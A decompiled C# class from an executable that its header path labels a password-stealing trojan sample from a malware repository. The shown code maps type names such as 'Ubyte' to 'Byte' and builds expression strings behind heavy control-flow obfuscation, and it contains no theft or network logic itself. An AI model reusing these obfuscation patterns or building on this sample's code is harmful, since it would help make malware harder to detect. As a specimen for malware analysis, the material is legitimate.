// Decompiled with JetBrains decompiler
// Type: rw.YwJ
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace rw
{
  public class YwJ
  {
    internal static YwJ eLU;

    public static string OHA(CU _param0)
    {
      string str1;
      switch (_param0)
      {
        case qy _:
          str1 = (_param0 as qy).atf().oRh();
          break;
        case cD _:
          string str2 = (_param0 as cD).Ct4().ToString();
          string str3 = str2;
          int num1 = 1;
          if (YwJ.JLB() == null)
            goto label_2;
label_1:
          int num2;
          num1 = num2;
label_2:
          string str4;
          while (true)
          {
            switch (num1)
            {
              case 1:
                str4 = str3;
                if (!(str4 == "Ubyte"))
                {
                  num1 = 2;
                  continue;
                }
                str1 = "Byte";
                num1 = 3;
                continue;
              case 2:
                if (str4 == "Sbyte")
                {
                  str1 = "Byte";
                  if (YwJ.NLA())
                  {
                    num1 = 0;
                    continue;
                  }
                  goto label_1;
                }
                else
                  goto label_4;
              default:
                goto label_12;
            }
          }
label_4:
          str1 = str2;
          break;
        default:
          str1 = "/* TODO!!! */";
          break;
      }
label_12:
      return str1;
    }

    public static string NHZ(cD _param0)
    {
      int num1 = 2;
label_1:
      string str1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str2;
        nH nH;
        while (true)
        {
          switch (num2)
          {
            case 1:
              str2 = nH.ToString();
              num2 = 13;
              continue;
            case 2:
              nH = _param0.Ct4();
              if (YwJ.NLA())
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            case 3:
            case 6:
              goto label_6;
            case 4:
            case 7:
            case 9:
            case 11:
            case 12:
              goto label_4;
            case 8:
              goto label_13;
            case 13:
              num3 = YwJ.nLX((object) str2);
              if (num3 > 1608375669U)
              {
                if (num3 > 2574022184U)
                {
                  if (num3 == 2805976770U)
                  {
                    if (str2 == "Ushort")
                    {
                      str1 = "UInt16";
                      num2 = 4;
                      continue;
                    }
                    goto label_14;
                  }
                  else
                  {
                    if (YwJ.JLB() == null)
                    {
                      num2 = 3;
                      continue;
                    }
                    goto label_1;
                  }
                }
                else if (num3 != 1621152906U)
                {
                  if (num3 == 2574022184U)
                  {
                    if (!(str2 == "Sbyte"))
                    {
                      num2 = YwJ.NLA() ? 10 : 8;
                      continue;
                    }
                    goto label_13;
                  }
                  else
                  {
                    num2 = !YwJ.NLA() ? 2 : 5;
                    continue;
                  }
                }
                else
                  goto label_17;
              }
              else if (num3 > 1167299699U)
              {
                switch (num3)
                {
                  case 1312746433:
                    if (!(str2 == "Uint"))
                    {
                      if (YwJ.JLB() == null)
                      {
                        num2 = 0;
                        continue;
                      }
                      goto label_1;
                    }
                    else
                    {
                      str1 = "UInt32";
                      if (YwJ.NLA())
                      {
                        num2 = 7;
                        continue;
                      }
                      goto label_1;
                    }
                  case 1608375669:
                    if (YwJ.pL0((object) str2, (object) "Short"))
                    {
                      str1 = "Int16";
                      num2 = 12;
                      continue;
                    }
                    goto label_14;
                  default:
                    goto label_14;
                }
              }
              else
                goto label_28;
            default:
              goto label_14;
          }
        }
label_6:
        if (num3 == 4168357374U && str2 == "Int")
        {
          str1 = "Int32";
          num1 = 9;
          continue;
        }
label_14:
        nH = _param0.Ct4();
        str1 = nH.ToString();
        num1 = 11;
        continue;
label_17:
        if (str2 == "Ubyte")
          goto label_38;
        else
          goto label_14;
label_28:
        switch (num3)
        {
          case 1152886286:
            if (str2 == "Ulong")
              goto label_33;
            else
              goto label_14;
          case 1167299699:
            if (str2 == "Long")
              goto label_25;
            else
              goto label_14;
          default:
            goto label_14;
        }
      }
label_4:
      return str1;
label_13:
      str1 = "SByte";
      goto label_4;
label_25:
      str1 = "Int64";
      goto label_4;
label_33:
      str1 = "UInt64";
      goto label_4;
label_38:
      str1 = "Byte";
      goto label_4;
    }

    public static string yHR(ez _param0, OA _param1) => YwJ.wHh(_param0.gdE(), _param1).Trim();

    public static string wHh(gwt _param0, OA _param1)
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.Append("(");
      int index = 0;
      while (true)
      {
        if (index < _param0.UdH().Count)
          goto label_12;
        else
          goto label_3;
label_1:
        int num1;
        int num2 = num1;
label_2:
        nv nv1;
        wwV wwV;
        bool flag;
        jwc jwc;
        int num3;
        switch (num2)
        {
          case 1:
            num3 = index < 2 ? 0 : (_param0.UdH()[index - 2] is wwV ? 1 : 0);
            break;
          case 2:
            jwc = nv1 as jwc;
            stringBuilder1.Append(((string) YwJ.ALP((object) _param1)).ToLower());
            foreach (m0 m0 in (IEnumerable<m0>) jwc.Qdc())
              stringBuilder1.Append("." + (string) YwJ.FLt((object) m0));
            if (_param0.UdH().Count > index + 2 && _param0.UdH()[index + 2] is wwV)
            {
              num3 = 1;
              break;
            }
            goto case 1;
          case 3:
            if (flag)
            {
              StringBuilder stringBuilder2 = stringBuilder1;
              m0 m0 = jwc.Qdc()[jwc.Qdc().Count - 1];
              string str = "." + (m0 == null ? (string) null : m0.ToString());
              YwJ.sLc((object) stringBuilder2, (object) str);
              goto label_8;
            }
            else
              goto label_8;
          case 4:
            Rr rr = nv1 as Rr;
            stringBuilder1.Append(rr.oRh());
            goto label_8;
          case 5:
            goto label_13;
          case 6:
            stringBuilder1.Append(wwV.xdi().oRh() + "." + wwV.xdi().oRh() + "Enum." + wwV.xdj().HJx());
            goto label_8;
          case 7:
            goto label_8;
          case 8:
            goto label_12;
          default:
            goto label_27;
        }
        flag = num3 != 0;
        num1 = 3;
        goto label_1;
label_3:
        num2 = !YwJ.NLA() ? 0 : 0;
        goto label_2;
label_8:
        ++index;
        continue;
label_12:
        nv1 = _param0.UdH()[index];
        if (!(nv1 is gwt))
        {
          if (nv1 is jwc)
          {
            num2 = 2;
            goto label_2;
          }
          else if (nv1 is wwV)
          {
            wwV = nv1 as wwV;
            num2 = 6;
            goto label_2;
          }
        }
        else
        {
          stringBuilder1.Append(YwJ.wHh(nv1 as gwt, _param1));
          num1 = 7;
          goto label_1;
        }
label_13:
        if (nv1 is Rr)
        {
          num2 = 2;
          if (YwJ.JLB() == null)
          {
            num2 = 4;
            goto label_2;
          }
          else
            goto label_2;
        }
        else
        {
          StringBuilder stringBuilder3 = stringBuilder1;
          nv nv2 = nv1;
          string str = nameof (\u0020) + (nv2 == null ? (string) null : nv2.ToString()) + nameof (\u0020);
          stringBuilder3.Append(str);
          goto label_8;
        }
      }
label_27:
      stringBuilder1.Append(")");
      return stringBuilder1.ToString();
    }

    public YwJ()
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool NLA() => YwJ.eLU == null;

    internal static YwJ JLB() => YwJ.eLU;

    internal static uint nLX([In] object obj0) => \u003CPrivateImplementationDetails\u003E.ComputeStringHash((string) obj0);

    internal static bool pL0([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    internal static object ALP([In] object obj0) => (object) ((OA) obj0).oRh();

    internal static object FLt([In] object obj0) => (object) ((m0) obj0).oRh();

    internal static object sLc([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).Append((string) obj1);
  }
}
